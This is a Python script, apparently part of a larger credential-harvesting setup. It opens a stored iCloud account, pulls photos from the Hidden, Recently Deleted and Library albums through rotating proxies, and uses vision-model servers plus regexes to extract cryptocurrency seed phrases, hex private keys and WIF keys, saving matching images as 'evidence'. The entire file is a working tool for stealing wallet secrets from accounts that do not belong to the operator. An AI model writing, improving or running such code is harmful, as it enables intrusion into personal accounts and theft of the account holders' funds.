#!/usr/bin/env python3
"""Stream one iCloud account and hunt for crypto material.

Images are downloaded through the download proxies, shrunk to 1024 px JPEG,
sent to the vision pods and thrown away: only the text, the label and (for
hits) a small evidence copy reach the disk.  Notes, the Drive PDFs and any
plain text are scanned for BIP39 runs, hex private keys and WIF keys.

    crypto_hunt.py --email a@b.com --out /tmp/hunt
"""
from __future__ import annotations

import argparse
import base64
import io
import itertools
import json
import os
import re
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import requests

sys.path.insert(0, "/opt/icloud3/python")
from bulk_images import load_accounts, open_api_safe  # noqa: E402
from worker import ocr_vlm, scan  # noqa: E402
from worker.ocr_vlm import (  # noqa: E402
    IMAGE_EXT,
    PODS,
    PROMPT,
    classify,
    model_for,
    parse_output,
    prepare_image,
    session,
)

PROXY_FILE = Path("/var/lib/icloud3-bulk/download_proxies.txt")
AREAS = ("Hidden", "Recently Deleted", "Library")
INTERESTING = {"seed", "seed-candidate", "crypto", "wallet", "ledger", "trezor", "recover", "secret", "privatekey", "backup", "exchange", "safeguard", "safe"}

HEX_RE = re.compile(r"\b(0x)?[0-9a-fA-F]{64}\b")
WIF_RE = re.compile(r"\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b")

_lock = threading.Lock()
_pod_cycle = itertools.cycle(range(len(PODS)))
_download_slots = threading.BoundedSemaphore(24)


def proxies() -> list[str]:
    out = []
    try:
        for line in PROXY_FILE.read_text().splitlines():
            parts = line.strip().split(":")
            if len(parts) == 4:
                out.append(f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}")
    except OSError:
        pass
    return out


PROXIES = proxies()
_proxy_cycle = itertools.cycle(PROXIES) if PROXIES else None


def fetch(url: str) -> bytes:
    with _download_slots:
        proxy = next(_proxy_cycle) if _proxy_cycle else None
        kwargs = {"timeout": 120}
        if proxy:
            kwargs["proxies"] = {"http": proxy, "https": proxy}
        response = requests.get(url, **kwargs)
        response.raise_for_status()
        return response.content


def shrink(raw: bytes) -> bytes:
    from PIL import Image, ImageFile, ImageOps

    ImageFile.LOAD_TRUNCATED_IMAGES = True
    Image.MAX_IMAGE_PIXELS = 500_000_000
    with Image.open(io.BytesIO(raw)) as image:
        if image.format in ("JPEG", "MPO"):
            image.draft("RGB", (1024, 1024))
        upright = ImageOps.exif_transpose(image) or image
        upright = upright.convert("RGB")
        upright.thumbnail((1024, 1024))
        buffer = io.BytesIO()
        upright.save(buffer, "JPEG", quality=80)
        return buffer.getvalue()


def ask_bytes(raw: bytes) -> tuple[str, str]:
    """Send one prepared JPEG to a pod; returns (text, pod)."""
    index = next(_pod_cycle)
    pod = PODS[index % len(PODS)]
    payload = {
        "model": model_for(pod),
        "temperature": 0,
        "max_tokens": 400,
        "messages": [
            {
                "role": "user",
                "content": [
                    {"type": "text", "text": PROMPT},
                    {
                        "type": "image_url",
                        "image_url": {"url": "data:image/jpeg;base64," + base64.b64encode(raw).decode()},
                    },
                ],
            }
        ],
    }
    last = None
    for attempt in range(3):
        try:
            response = session().post(f"{pod}/chat/completions", json=payload, timeout=180)
            response.raise_for_status()
            return response.json()["choices"][0]["message"]["content"], pod
        except Exception as error:  # noqa: BLE001
            last = error
            if attempt < 2:
                time.sleep(1 + attempt * 3)
    raise RuntimeError(f"{type(last).__name__}: {str(last)[:120]}")


def text_findings(text: str, index: dict) -> dict:
    """BIP39 runs, hex keys and WIF keys inside plain text."""
    return {
        "phrases": list(scan.find_sequences(text or "", index)),
        "hex": sorted(set(HEX_RE.findall(text or ""))),
        "wif": sorted(set(WIF_RE.findall(text or ""))),
    }


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--email", required=True)
    parser.add_argument("--out", required=True)
    parser.add_argument("--workers", type=int, default=48)
    parser.add_argument("--limit", type=int, default=0)
    parser.add_argument("--areas", default=",".join(AREAS))
    parser.add_argument("--rendition", default="thumb", choices=("thumb", "medium", "original"))
    parser.add_argument("--upgrade", action="store_true", help="re-read the interesting rows of an existing images.jsonl at medium quality")
    args = parser.parse_args()

    out = Path(args.out)
    (out / "evidence").mkdir(parents=True, exist_ok=True)
    results = out / "images.jsonl"
    started = time.time()

    if args.upgrade:
        rows = [json.loads(line) for line in (out / "images.jsonl").read_text().splitlines() if line.strip()]
        todo = [
            row
            for row in rows
            if row.get("checksum")
            or row.get("kind") in INTERESTING
            or row.get("text_phrases")
            or row.get("hex")
            or row.get("wif")
            or (row.get("hasText") and row.get("raw"))
        ]
        print(f"[hunt] upgrade {len(todo)} of {len(rows)} rows", flush=True)
        for row in todo:
            url = row.get("medium") or ""
            if not url:
                continue
            try:
                raw = shrink(fetch(url))
                text, pod = ask_bytes(raw)
                result = parse_output(text)
                labels = classify(text, result)
                row.update(
                    {
                        "kind_medium": labels["kind"],
                        "checksum_medium": result["checksum"],
                        "count_medium": result["count"],
                        "phrase_medium": " ".join(result["words"]) if result["words"] else "",
                        "raw_medium": (text or "")[:4000],
                        "pod_medium": pod,
                    }
                )
                (out / "images.jsonl").write_text("\n".join(json.dumps(r, ensure_ascii=False) for r in rows) + "\n")
            except Exception as error:  # noqa: BLE001
                row["upgrade_error"] = f"{type(error).__name__}: {str(error)[:120]}"
        print("[hunt] upgrade finished", flush=True)
        return

    account = next(a for a in load_accounts() if a["email"] == args.email)
    api = open_api_safe(account)
    print(f"[hunt] session ok, proxies {len(PROXIES)}", flush=True)

    word_index = scan.word_index()
    tasks = []
    for area in [a.strip() for a in args.areas.split(",") if a.strip()]:
        try:
            album = api.photos.albums[area]
        except Exception as error:  # noqa: BLE001
            print(f"[hunt] {area}: {type(error).__name__}", flush=True)
            continue
        count = 0
        for asset in album:
            versions = getattr(asset, "versions", {}) or {}
            original = versions.get("original") or {}
            chosen = versions.get(args.rendition) or original
            url = chosen.get("url")
            name = str(original.get("filename") or getattr(asset, "filename", "") or "")
            if not url or not name:
                continue
            if Path(name).suffix.lower() not in IMAGE_EXT:
                continue
            tasks.append(
                {
                    "area": area,
                    "name": name,
                    "url": url,
                    "medium": (versions.get("medium") or {}).get("url") or "",
                    "id": str(getattr(asset, "id", "")),
                }
            )
            count += 1
            if args.limit and len(tasks) >= args.limit:
                break
        print(f"[hunt] {area}: {count} images", flush=True)
        if args.limit and len(tasks) >= args.limit:
            break

    print(f"[hunt] {len(tasks)} images to read", flush=True)
    done = hits = 0
    write_lock = threading.Lock()
    handle = results.open("w")

    def one(task: dict) -> None:
        nonlocal done, hits
        record = {"area": task["area"], "name": task["name"], "id": task["id"], "medium": task.get("medium", "")}
        try:
            raw = shrink(fetch(task["url"]))
            text, pod = ask_bytes(raw)
            result = parse_output(text)
            labels = classify(text, result)
            record.update(
                {
                    "kind": labels["kind"],
                    "checksum": result["checksum"],
                    "count": result["count"],
                    "phrase": " ".join(result["words"]) if result["words"] else "",
                    "hasText": labels["hasText"],
                    "pod": pod,
                    "raw": (text or "")[:4000],
                }
            )
            extra = text_findings(text, word_index)
            if extra["phrases"]:
                record["text_phrases"] = extra["phrases"][:5]
            if extra["hex"]:
                record["hex"] = extra["hex"][:5]
            if extra["wif"]:
                record["wif"] = extra["wif"][:3]
            interesting = (
                record["checksum"]
                or record["kind"] in INTERESTING
                or extra["phrases"]
                or extra["hex"]
                or extra["wif"]
            )
            if interesting:
                safe = re.sub(r"[^A-Za-z0-9._-]+", "_", task["name"])[:80]
                (out / "evidence" / f"{task['area'][:3]}_{safe}").write_bytes(raw)
                hits += 1
        except Exception as error:  # noqa: BLE001
            record["error"] = f"{type(error).__name__}: {str(error)[:150]}"
        with write_lock:
            handle.write(json.dumps(record, ensure_ascii=False) + "\n")
            handle.flush()
            done += 1
            if done % 250 == 0:
                rate = done / max(time.time() - started, 1)
                print(f"[hunt] {done}/{len(tasks)} at {rate:.1f}/s hits {hits}", flush=True)

    with ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        list(pool.map(one, tasks))

    handle.close()
    elapsed = time.time() - started
    print(f"[hunt] done {done} images in {elapsed:.0f}s, {hits} hits -> {results}", flush=True)


if __name__ == "__main__":
    main()
